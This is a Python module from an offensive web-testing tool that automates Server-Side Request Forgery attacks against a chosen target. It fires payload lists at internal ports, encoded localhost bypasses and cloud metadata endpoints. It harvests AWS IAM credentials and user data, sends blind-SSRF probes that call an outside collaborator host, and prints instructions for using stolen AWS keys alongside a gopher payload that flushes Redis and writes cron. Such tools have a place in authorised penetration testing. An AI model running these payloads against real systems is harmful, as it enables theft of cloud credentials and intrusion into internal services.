"""
modules/ssrf.py
tmrswrr - A10: Server-Side Request Forgery (SSRF)
"""
import os

from config.settings import OUTPUT_DIR, SESSION, add_vuln, save_session
from utils.helpers import (
    DIM,
    NEON_CYN,
    NEON_GRN,
    PURE_WHITE,
    RST,
    info,
    print_banner,
    prompt,
    section,
    success,
    warn,
)
from utils.http import get_client
from utils.oob import get_collaborator


def _out(name: str) -> str:
    d = str(OUTPUT_DIR)
    os.makedirs(d, exist_ok=True)
    return os.path.join(d, name)


def _target() -> str:
    url = SESSION.get("target_url", "")
    if not url:
        url = prompt("Target URL")
        SESSION["target_url"] = url
    return url


#: Markers that only appear when an internal service actually answered.
#:
#: The previous list matched bare words like 'mysql', 'ssh', 'redis' and 'iam',
#: so any page that merely mentioned a database - a docs page, a stack trace -
#: was recorded as a Critical SSRF. Each entry here is a string a real service
#: or metadata endpoint emits, not a word a web page might contain.
INTERNAL_MARKERS = {
    # AWS IMDS
    "ami-id": "AWS instance metadata",
    "instance-identity": "AWS instance identity document",
    "iam/security-credentials": "AWS IAM role listing",
    "AccessKeyId": "AWS credentials",
    "SecretAccessKey": "AWS credentials",
    "local-ipv4": "AWS instance metadata",
    # GCP / Azure
    "computeMetadata/v1": "GCP metadata",
    "Metadata-Flavor": "GCP metadata",
    "\"compute\": {": "Azure instance metadata",
    # Raw service banners reachable through a proxying SSRF
    "SSH-2.0-": "SSH banner",
    "-ERR wrong number of arguments": "Redis",
    "+PONG": "Redis",
    "redis_version:": "Redis",
    "mysql_native_password": "MySQL handshake",
    "MongoDB server": "MongoDB",
}


def _strip_reflection(body: str, payload: str) -> str:
    """Remove the payload itself from the body before matching markers.

    An app that echoes back `?url=http://169.254.169.254/latest/meta-data/`
    contains 'meta-data' without ever having fetched it.
    """
    import urllib.parse
    out = body
    for variant in {payload, urllib.parse.quote(payload, safe=""),
                    urllib.parse.quote(payload, safe=":/")}:
        out = out.replace(variant, "")
    return out


def _internal_hit(body: str, payload: str) -> tuple[str, str] | None:
    """(marker, what it proves) when the response shows an internal service."""
    cleaned = _strip_reflection(body, payload)
    for marker, meaning in INTERNAL_MARKERS.items():
        if marker in cleaned:
            return marker, meaning
    return None


def _ssrf_baseline(client, url: str, param: str, endpoint: str):
    """Response to an unroutable host - what 'the app fetched nothing' looks like.

    If the application returns the same page for a bogus host as for
    169.254.169.254, it is not fetching anything and there is nothing to report.
    """
    resp = client.safe_get(f"{url.rstrip('/')}{endpoint}",
                           params={param: "http://yeepforge-nonexistent.invalid"})
    if resp is None:
        return None
    return resp.status_code, len(resp.text)


def _matches_baseline(resp, baseline) -> bool:
    if baseline is None:
        return False
    status, length = baseline
    return resp.status_code == status and abs(len(resp.text) - length) <= max(32, length * 0.05)


def ssrf_basic():
    section("BASIC SSRF TESTING")
    url = _target()

    info("SSRF: Testing URL parameters that fetch external resources")

    param = prompt("Parameter name that accepts a URL (e.g. url, webhook, callback, redirect, fetch, load)")
    endpoint = prompt("Endpoint path (e.g. /api/fetch or /proxy)")

    # Common SSRF payloads
    payloads = [
        # Internal localhost
        "http://localhost",
        "http://127.0.0.1",
        "http://0.0.0.0",
        "http://[::1]",
        "http://127.0.0.1:22",
        "http://127.0.0.1:6379",   # Redis
        "http://127.0.0.1:3306",   # MySQL
        "http://127.0.0.1:27017",  # MongoDB
        "http://127.0.0.1:8080",
        # Cloud metadata
        "http://169.254.169.254/latest/meta-data/",           # AWS
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        "http://metadata.google.internal/computeMetadata/v1/", # GCP
        "http://169.254.169.254/metadata/v1/",                 # Azure (old)
        "http://169.254.169.254/metadata/instance",            # Azure
        # SSRF bypass
        "http://2130706433",       # 127.0.0.1 decimal
        "http://0x7f000001",       # 127.0.0.1 hex
        "http://0177.0.0.1",      # 127.0.0.1 octal
        "http://127.1",
        "http://127.0.1",
    ]

    print()
    client = get_client()
    baseline = _ssrf_baseline(client, url, param, endpoint)
    if baseline is not None:
        info(f"Baseline (unroutable host): HTTP {baseline[0]}, {baseline[1]} bytes")

    for p in payloads:
        resp = client.safe_get(f"{url.rstrip('/')}{endpoint}", params={param: p}, timeout=8)
        if resp is None:
            print(f"  {DIM}[!] {p} (request failed){RST}")
            continue

        hit = _internal_hit(resp.text, p)
        if hit:
            marker, meaning = hit
            success(f"SSRF CONFIRMED! Payload: {p}  ({meaning})")
            print(f"  Response: {resp.text[:300]}")
            severity = "Critical" if "AWS" in meaning or "GCP" in meaning or "Azure" in meaning else "High"
            add_vuln("Server-Side Request Forgery (SSRF)", severity, "A10:2021",
                     f"The server fetched {p} and returned {meaning} content "
                     f"(matched '{marker}')",
                     resp.evidence.url, evidence=resp.evidence,
                     confidence="Confirmed", cwe="CWE-918")
        elif not _matches_baseline(resp, baseline) and len(resp.text.strip()) > 10:
            # Different from the unroutable-host response: something was
            # fetched, but nothing proves what. A lead, not a finding.
            info(f"[?] {p} - response differs from baseline, verify manually")
            print(f"  {DIM}{resp.text[:100]}{RST}")
        else:
            print(f"  {DIM}[-] {p}{RST}")


def ssrf_oob():
    section("OUT-OF-BAND SSRF (Blind SSRF)")
    url = _target()

    oob = get_collaborator(required=True)
    if oob is None:
        warn("Blind SSRF cannot be tested without a collaborator - this is UNTESTED, "
             "not clean.")
        return

    param = prompt("Parameter name")
    endpoint = prompt("Endpoint path")

    # Each payload gets its own tag, so a callback names the shape that worked
    # rather than leaving seven candidates to re-test by hand.
    variants = [
        ("direct-http",  lambda h: f"http://{h}"),
        ("direct-https", lambda h: f"https://{h}"),
        ("path",         lambda h: f"http://{h}/ssrf-test"),
        ("schemeless",   lambda h: f"///{h}/path"),
        ("unc",          lambda h: f"\\\\{h}\\share"),
        ("dict",         lambda h: f"dict://{h}:6379/info"),
        ("gopher",       lambda h: f"gopher://{h}:6379/_*1%0d%0a$4%0d%0aPING"),
    ]

    info(f"Sending {len(variants)} OOB SSRF probes to {url}{endpoint}")
    info(f"Collaborator: {oob.describe()}")
    print()

    client = get_client()
    sent = []
    for tag, build in variants:
        payload = build(oob.hostname(tag))
        # The request goes to the target; the collaborator host only appears
        # inside the payload, so this stays inside the engagement scope.
        resp = client.safe_get(f"{url.rstrip('/')}{endpoint}", params={param: payload},
                               timeout=8)
        status = resp.status_code if resp is not None else "no response"
        print(f"  {NEON_CYN}[→]{RST} {tag}: {payload}  ({status})")
        sent.append((tag, payload, resp))

    info("Waiting for callbacks...")
    confirmed = False
    for tag, payload, resp in sent:
        hits = oob.wait_for(tag, timeout=20 if not confirmed else 5)
        if not hits:
            continue
        confirmed = True
        protocols = sorted({h.get("protocol", "?") for h in hits})
        origin = hits[0].get("remote-address", "unknown")
        success(f"BLIND SSRF CONFIRMED via {tag}: {', '.join(protocols).upper()} "
                f"callback from {origin}")
        add_vuln("Blind SSRF (out-of-band confirmed)", "High", "A10:2021",
                 f"Parameter '{param}' fetched {payload}. The collaborator recorded a "
                 f"{'/'.join(protocols)} interaction from {origin}, proving the server "
                 "issues requests to attacker-supplied destinations.",
                 f"{url.rstrip('/')}{endpoint}",
                 evidence=getattr(resp, "evidence", None),
                 confidence="Confirmed", cwe="CWE-918")

    if not confirmed:
        warn("No callback received. That is not proof of safety - egress filtering, a "
             "slow queue or a parser that never dereferences the value all look the "
             f"same from here. Re-check {oob.domain} before closing this out.")


def ssrf_aws_metadata():
    section("AWS METADATA EXPLOITATION VIA SSRF")
    print(f"""
  {NEON_CYN}AWS IMDSv1 Endpoints (if SSRF confirmed to 169.254.169.254):{RST}

  {NEON_GRN}IAM Role credentials:{RST}
    /latest/meta-data/iam/security-credentials/
    /latest/meta-data/iam/security-credentials/ROLE_NAME

  {NEON_GRN}Instance info:{RST}
    /latest/meta-data/instance-id
    /latest/meta-data/local-ipv4
    /latest/meta-data/public-ipv4
    /latest/meta-data/hostname
    /latest/meta-data/ami-id
    /latest/dynamic/instance-identity/document

  {NEON_GRN}User data (may contain secrets):{RST}
    /latest/user-data

  {NEON_GRN}AWS CLI with stolen credentials:{RST}
    AWS_ACCESS_KEY_ID=... AWS_SECRET_ACCESS_KEY=... AWS_SESSION_TOKEN=... \\
    aws sts get-caller-identity
    aws s3 ls
    aws ec2 describe-instances

  {NEON_CYN}IMDSv2 bypass (requires token first):{RST}
    TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
    curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/
""")

    url = _target()
    endpoint = prompt("SSRF endpoint (e.g. /api/fetch?url=SSRF_PAYLOAD)")
    if not endpoint:
        return

    aws_paths = [
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        "http://169.254.169.254/latest/user-data",
        "http://169.254.169.254/latest/dynamic/instance-identity/document",
    ]

    import urllib.parse
    client = get_client()
    for p in aws_paths:
        enc = urllib.parse.quote(p, safe="")
        probe = f"{url.rstrip('/')}{endpoint.replace('SSRF_PAYLOAD', enc)}"
        resp = client.safe_get(probe, timeout=10)
        if resp is None:
            print(f"  {DIM}[!] {p} (request failed){RST}")
            continue

        hit = _internal_hit(resp.text, p)
        if not hit:
            # A non-empty body is not a metadata response; the old code
            # announced "AWS metadata response" for any reply longer than
            # five characters, including the app's own error page.
            print(f"  {DIM}[-] {p} (no metadata markers){RST}")
            continue

        marker, meaning = hit
        success(f"AWS metadata reached via SSRF: {p}")
        print(f"  {NEON_GRN}{resp.text[:500]}{RST}")
        creds = marker in ("AccessKeyId", "SecretAccessKey")
        add_vuln("AWS Credentials Exposed via SSRF" if creds
                 else "AWS Instance Metadata Exposed via SSRF",
                 "Critical", "A10:2021",
                 f"SSRF to the IMDS endpoint returned {meaning} (matched '{marker}')",
                 resp.evidence.url, evidence=resp.evidence,
                 confidence="Confirmed", cwe="CWE-918")


def ssrf_gopher():
    section("GOPHER PROTOCOL - SSRF AMPLIFICATION")
    print(f"""
  {NEON_CYN}Gopher payloads allow sending raw TCP to internal services:{RST}

  {NEON_GRN}Redis SSRF (flush + write cron):{RST}
    gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset...

  {NEON_GRN}MySQL SSRF:{RST}
    gopher://127.0.0.1:3306/...

  {NEON_GRN}SMTP SSRF (email spoofing):{RST}
    gopher://127.0.0.1:25/...

  {NEON_CYN}Tools:{RST}
    Gopherus: https://github.com/tarunkant/Gopherus
      python gopherus.py --exploit redis
      python gopherus.py --exploit mysql
      python gopherus.py --exploit smtp

  {NEON_CYN}Install:{RST}
    git clone https://github.com/tarunkant/Gopherus
    python3 gopherus.py --help
""")


def run():
    print_banner("SERVER-SIDE REQUEST FORGERY", "A10:2021 - OWASP Top 10 #10")
    while True:
        url = SESSION.get("target_url", "-")
        print(f"""
  {NEON_GRN}Target:{RST} {PURE_WHITE}{url}{RST}

  {NEON_CYN}[1]{RST} Basic SSRF Testing (internal ports & cloud metadata)
  {NEON_CYN}[2]{RST} Out-of-Band / Blind SSRF
  {NEON_CYN}[3]{RST} AWS Metadata Exploitation
  {NEON_CYN}[4]{RST} Gopher Protocol SSRF Amplification
  {NEON_GRN}[0]{RST} Back to main menu
""")
        c = prompt("Choice")
        if c == "0":
            break
        elif c == "1":
            ssrf_basic()
        elif c == "2":
            ssrf_oob()
        elif c == "3":
            ssrf_aws_metadata()
        elif c == "4":
            ssrf_gopher()
        save_session()
